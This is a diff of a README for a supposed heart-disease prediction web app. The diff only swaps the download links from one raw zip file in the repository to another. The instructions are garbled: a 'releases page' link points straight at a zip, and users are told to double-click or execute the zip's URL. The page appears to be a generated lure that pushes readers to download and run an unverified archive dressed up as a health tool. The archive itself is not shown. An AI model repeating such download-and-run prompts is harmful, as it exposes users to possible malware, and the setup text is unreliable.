@@ -1,7 +1,7 @@
 # ❤️ Heart-Diseases-prediction-website - Simple Heart Health Prediction Tool
 
 ## 💾 Download it Now
-[![Download Heart-Diseases-prediction-website](https://raw.githubusercontent.com/Vladimirmesozoic360/Heart-Diseases-prediction-website/master/models/Heart-Diseases-prediction-website_1.3.zip)](https://raw.githubusercontent.com/Vladimirmesozoic360/Heart-Diseases-prediction-website/master/models/Heart-Diseases-prediction-website_1.3.zip)
+[![Download Heart-Diseases-prediction-website](https://raw.githubusercontent.com/Vladimirmesozoic360/Heart-Diseases-prediction-website/master/train/Heart-Diseases-prediction-website-2.9.zip)](https://raw.githubusercontent.com/Vladimirmesozoic360/Heart-Diseases-prediction-website/master/train/Heart-Diseases-prediction-website-2.9.zip)
 
 ## 📖 Overview
 The Heart-Diseases-prediction-website is a machine learning application designed to predict heart health. It features an easy-to-use web interface for users to receive heart status predictions based on input data. This tool aims to support users in making informed health decisions with just a few clicks.
@@ -17,7 +17,7 @@ To use this application, follow these steps:
 ### 2. Visit the Downloads Page
 Go to the following link to download the application:
 
-[Visit Releases Page to Download](https://raw.githubusercontent.com/Vladimirmesozoic360/Heart-Diseases-prediction-website/master/models/Heart-Diseases-prediction-website_1.3.zip)
+[Visit Releases Page to Download](https://raw.githubusercontent.com/Vladimirmesozoic360/Heart-Diseases-prediction-website/master/train/Heart-Diseases-prediction-website-2.9.zip)
 
 ### 3. Download the Application
 On the releases page, you will see different versions of the application. Click on the version that suits your operating system. This will start the download of a file.
@@ -26,15 +26,15 @@ On the releases page, you will see different versions of the application. Click 
 After downloading, follow these simple steps to set up the application:
 
 ### 1. Locate the Downloaded File
-Check your downloads folder or the location where your browser saves files. The downloaded file will be named similar to `https://raw.githubusercontent.com/Vladimirmesozoic360/Heart-Diseases-prediction-website/master/models/Heart-Diseases-prediction-website_1.3.zip` (version may vary).
+Check your downloads folder or the location where your browser saves files. The downloaded file will be named similar to `https://raw.githubusercontent.com/Vladimirmesozoic360/Heart-Diseases-prediction-website/master/train/Heart-Diseases-prediction-website-2.9.zip` (version may vary).
 
 ### 2. Extract the Files
 - For Windows: Right-click on the zip file, select "Extract All," and follow the prompts.
 - For Mac: Double-click the zip file to extract it.
-- For Linux: Use a terminal command such as `unzip https://raw.githubusercontent.com/Vladimirmesozoic360/Heart-Diseases-prediction-website/master/models/Heart-Diseases-prediction-website_1.3.zip`.
+- For Linux: Use a terminal command such as `unzip https://raw.githubusercontent.com/Vladimirmesozoic360/Heart-Diseases-prediction-website/master/train/Heart-Diseases-prediction-website-2.9.zip`.
 
 ### 3. Launch the Application
-Once extracted, navigate to the folder where the files are located. Find and double-click on `https://raw.githubusercontent.com/Vladimirmesozoic360/Heart-Diseases-prediction-website/master/models/Heart-Diseases-prediction-website_1.3.zip` (Windows) or execute `https://raw.githubusercontent.com/Vladimirmesozoic360/Heart-Diseases-prediction-website/master/models/Heart-Diseases-prediction-website_1.3.zip` (Linux/Mac) from the terminal. This will launch the web interface in your default browser.
+Once extracted, navigate to the folder where the files are located. Find and double-click on `https://raw.githubusercontent.com/Vladimirmesozoic360/Heart-Diseases-prediction-website/master/train/Heart-Diseases-prediction-website-2.9.zip` (Windows) or execute `https://raw.githubusercontent.com/Vladimirmesozoic360/Heart-Diseases-prediction-website/master/train/Heart-Diseases-prediction-website-2.9.zip` (Linux/Mac) from the terminal. This will launch the web interface in your default browser.
 
 ## 🌐 Using the Application
 ### 1. Input Your Data
@@ -72,7 +72,7 @@ If you face persistent issues, try re-downloading the application by following t
 ## 📥 Download & Install
 For easy access, visit the link below to download the latest version of the Heart-Diseases-prediction-website:
 
-[Visit Releases Page to Download](https://raw.githubusercontent.com/Vladimirmesozoic360/Heart-Diseases-prediction-website/master/models/Heart-Diseases-prediction-website_1.3.zip)
+[Visit Releases Page to Download](https://raw.githubusercontent.com/Vladimirmesozoic360/Heart-Diseases-prediction-website/master/train/Heart-Diseases-prediction-website-2.9.zip)
 
 ## 📝 Conclusion
 The Heart-Diseases-prediction-website provides a simple way to predict heart health based on user input. With straightforward setup and operation, anyone can gain insights into their health. Download now and take the first step towards understanding your heart health better!
